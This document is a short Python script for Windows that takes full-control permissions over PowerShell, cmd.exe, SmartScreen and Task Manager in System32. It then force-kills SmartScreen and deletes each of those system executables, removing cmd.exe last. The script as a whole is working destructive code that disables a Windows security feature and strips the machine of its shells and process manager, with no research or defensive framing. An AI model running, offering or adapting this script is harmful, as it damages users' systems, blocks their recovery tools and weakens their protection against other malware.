#!/usr/bin/python
#coding:utf-8
import os, sys, time

# Get the current username from environment variable
usr = os.environ["USERNAME"]

# Function to get full permission on powershell process windows
def icc_powershell():
    procs = ['powershell.exe', 'powershell_ise.exe']
    for proc in procs:
        ica = "\\windows\\system32\\icacls.exe \\Windows\\System32\\WindowsPowerShell\\v1.0\\%s /grant %s:F " %(proc, usr)
        os.system(ica)
icc_powershell()
# Function to get full permission on main process windows
def icc_sys32():
    procs = ['cmd.exe', 'smartscreen.exe', 'taskmgr.exe']
    for proc in procs:
        ica = "\\windows\\system32\\icacls.exe \\Windows\\System32\\%s /grant %s:F " %(proc, usr)
        os.system(ica)
icc_sys32()
# Function to kill a process with force option
def pkill_smart():
    try:
        killed = "taskkill /IM smartscreen.exe /F"
        os.system(killed)
    except Exception:
        killed = 0
    return killed
pkill_smart()
# Function to delete all process in the directory
def remove_proc():
    pwr_sh = ['powershell.exe', 'powershell_ise.exe']
    for proc in pwr_sh:
        cmd = "del \\windows\\system32\\WindowsPowerShell\\v1.0\\%s " %(proc)
        os.system(cmd)
    procs = ['smartscreen.exe', 'taskmgr.exe']
    for proc in procs:
        cmd = "del \\windows\\system32\\%s " %(proc)
        os.system(cmd)
remove_proc()
# Delete cmd.exe last because he used for running the program
os.remove("\\windows\\system32\\cmd.exe")
